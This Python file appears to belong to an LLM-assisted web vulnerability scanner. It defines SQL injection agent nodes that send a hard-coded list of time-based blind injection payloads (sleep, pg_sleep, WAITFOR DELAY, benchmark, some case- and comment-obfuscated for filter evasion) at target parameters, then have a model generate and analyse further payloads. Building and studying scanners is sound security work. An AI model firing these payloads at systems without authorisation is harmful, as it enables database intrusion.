import json
import httpx
import asyncio
from langchain_openai import ChatOpenAI
from langchain_core.prompts import ChatPromptTemplate
from src.config.settings import settings
from src.utils.auditor import auditor
from src.core.llm.service import create_audited_llm
from src.agents.sqli.state import SQLiState
from src.core.engine.strategist import GenericStrategist
from src.core.engine.executor import GenericExecutor
from loguru import logger

from src.agents.base.nodes import BaseVulnNodes

from src.core.prompts.sqli import SQLI_GENERATOR_PROMPT, SQLI_ANALYZER_PROMPT

class SQLiNodes(BaseVulnNodes):
    def __init__(self):
        super().__init__(retry_key="sqli_retry_count")

    # 静态 Payloads (Wapiti Style - 覆盖 MySQL, PostgreSQL, MSSQL 时间盲注)
    STATIC_PAYLOADS = [
        "sleep(5)#",
        "1 or sleep(5)#",
        "\" or sleep(5)#",
        "' or sleep(5)#",
        "\" or sleep(5)=\"",
        "' or sleep(5)='",
        "1) or sleep(5)#",
        "\") or sleep(5)=\"",
        "') or sleep(5)='",
        "1)) or sleep(5)#",
        "\")) or sleep(5)=\"",
        "')) or sleep(5)='",
        ";waitfor delay '0:0:5'--",
        ");waitfor delay '0:0:5'--",
        "';waitfor delay '0:0:5'--",
        "\";waitfor delay '0:0:5'--",
        "');waitfor delay '0:0:5'--",
        "\");waitfor delay '0:0:5'--",
        "));waitfor delay '0:0:5'--",
        "'));waitfor delay '0:0:5'--",
        "\"));waitfor delay '0:0:5'--",
        "benchmark(10000000,MD5(1))#",
        "1 or benchmark(10000000,MD5(1))#",
        "\" or benchmark(10000000,MD5(1))#",
        "' or benchmark(10000000,MD5(1))#",
        "1) or benchmark(10000000,MD5(1))#",
        "\") or benchmark(10000000,MD5(1))#",
        "') or benchmark(10000000,MD5(1))#",
        "1)) or benchmark(10000000,MD5(1))#",
        "\")) or benchmark(10000000,MD5(1))#",
        "')) or benchmark(10000000,MD5(1))#",
        "pg_sleep(5)--",
        "1 or pg_sleep(5)--",
        "\" or pg_sleep(5)--",
        "' or pg_sleep(5)--",
        "1) or pg_sleep(5)--",
        "\") or pg_sleep(5)--",
        "') or pg_sleep(5)--",
        "1)) or pg_sleep(5)--",
        "\")) or pg_sleep(5)--",
        "')) or pg_sleep(5)--",
        "'And(sElect*fRom(SeleCt+SleEp(3))a/**/uNiOn/**/sElect+1)='",
        "\"aNd(seLect*From(seLeCt+sleEp(3))a/**/UniOn/**/selEcT+1)=\"",
        "'/**/And(sEleCt'1'fRom/**/Pg_slEep(3))::text>'0",
        "\"/**/and(sElect'1'frOm/**/Pg_sLeep(3))::text>\"0",
        "(sEleCt*fRom(seLect+slEep(3)union/**/sEleCt+1)a)",
        "'+WAITFOR+DELAY+'0:0:3'--+",
        ";WAITFOR DELAY '0:0:3'--+"
    ]

    async def strategist_node(self, state: SQLiState) -> dict:
        """调用通用引擎生成 SQLi Payload"""
        
        # 策略 1: 如果是首次执行 (retry_count == 0 且无 feedback)，使用静态 Payload
        if state.get(self.retry_key, 0) == 0 and not state.get("analysis_feedback"):
            logger.info("SQLi 首次执行，使用静态高频 Payloads (Wapiti Style) 进行探测")
            static_cases = []
            points = state.get("potential_points", [])
            
            # 为避免请求爆炸，只对前 3 个参数进行全量测试
            target_points = points[:3] if len(points) > 3 else points

            for point in target_points:
                for payload in self.STATIC_PAYLOADS:
                    # 构造测试用例
                    # 注意：如果 point 是 RESTful 占位符 (如 /user/{{PAYLOAD}})，Executor 会处理替换
                    static_cases.append({
                        "parameter": point,
                        "payload": payload
                    })
            
            if static_cases:
                logger.info(f"生成静态测试用例: {len(static_cases)} 个")
                return {"test_results": static_cases}

        # 策略 2: 如果静态测试失败或有反馈，调用 LLM 进行针对性生成
        return await self._generic_strategist_node(state, SQLI_GENERATOR_PROMPT, "SQLi")

    async def analyzer_node(self, state: SQLiState) -> dict:
        """SQLi 专用分析器"""
        prompt = ChatPromptTemplate.from_messages([
            ("system", SQLI_ANALYZER_PROMPT),
            ("user", "原始响应片段: {orig}\n测试结果: {results}")
        ])
        
        # 限制发送给 LLM 的结果数量，避免上下文过长
        results_summary = []
        for r in state["test_results"]:
            summary_item = {
                "parameter": r.get("parameter"),
                "payload": r.get("payload"),
                "status": r.get("status"),
                "elapsed": r.get("elapsed"),
                "len_diff": r.get("len_diff"),
                "similarity": r.get("similarity")
            }
            # 如果相似度过高（无变化），则省略 response_slice 以节省 Token
            if r.get("similarity", 1.0) < 0.99:
                summary_item["response_slice"] = r.get("response", "")[:300]
            
            results_summary.append(summary_item)

        return await self._generic_analyzer_node(
            state=state,
            prompt=prompt,
            results_summary=results_summary,
            vuln_type="SQLi",
            findings_type="SQL Injection",
            agent_name="SQLi_Analyzer"
        )

